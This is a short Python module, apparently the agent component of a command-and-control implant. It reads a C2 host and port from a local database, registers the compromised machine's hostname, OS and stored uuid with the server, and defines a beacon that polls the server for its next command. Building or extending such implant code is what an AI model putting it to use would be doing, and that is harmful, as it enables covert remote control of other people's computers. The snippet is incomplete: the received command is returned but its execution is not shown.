import json
from socket import gethostname
from sys import platform

from .settings import *
from .lib.decorators import Request

from .db.SQLite import Helper

db = Helper()
fetch = Request(db.get_config('c2_host'), port=int(db.get_config('c2_port')))



def register():
    data = {
        "name": gethostname(),
        "os": platform,
    }

    uuid = db.get_config('uuid')
    if uuid:
        data['uuid'] = uuid

    @fetch('/api/agents/', proto="POST", data=data)
    def handle(resp):
        print resp
        resp_json = json.loads(resp)
        db.set_config('uuid', resp_json['uuid'])
    handle()


@fetch('/api/agents/beacon')
def beacon(resp):
    resp_json = json.loads(resp)
    return resp_json['command']

